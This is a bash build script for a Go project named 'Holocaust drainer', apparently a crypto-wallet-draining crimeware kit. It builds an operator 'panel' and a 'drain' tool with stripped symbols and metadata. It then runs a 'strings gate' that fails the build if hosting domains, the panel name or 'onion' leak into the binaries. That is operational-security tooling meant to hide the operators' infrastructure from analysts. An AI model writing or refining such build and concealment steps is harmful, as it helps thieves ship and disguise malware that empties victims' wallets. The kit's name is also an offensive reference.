#!/usr/bin/env bash
# Holocaust drainer — reproducible release builds (flag doctrine per skill).
set -euo pipefail
cd "$(dirname "$0")"

FLAGS=(-trimpath -buildvcs=false -ldflags "-s -w")

echo "[*] vet"
go vet ./...

echo "[*] building panel"
go build "${FLAGS[@]}" -o holocaust ./cmd/holocaust

echo "[*] building drain tool"
CGO_ENABLED=0 go build "${FLAGS[@]}" -o drain ./cmd/drain

echo "[*] strings gate (operator-side URLs must not appear)"
if strings -n 8 holocaust | grep -qE 'netlify\.app|github\.io'; then
  echo "FAIL: static-host name leaked into panel binary" >&2
  exit 1
fi
if strings -n 8 drain | grep -qiE 'holocaust|onion'; then
  echo "FAIL: panel identity leaked into drain tool" >&2
  exit 1
fi

echo "[OK] holocaust  -> $(sha256sum holocaust | cut -c1-16)…  $(du -h holocaust | cut -f1)"
echo "[OK] drain      -> $(sha256sum drain | cut -c1-16)…  $(du -h drain | cut -f1)"
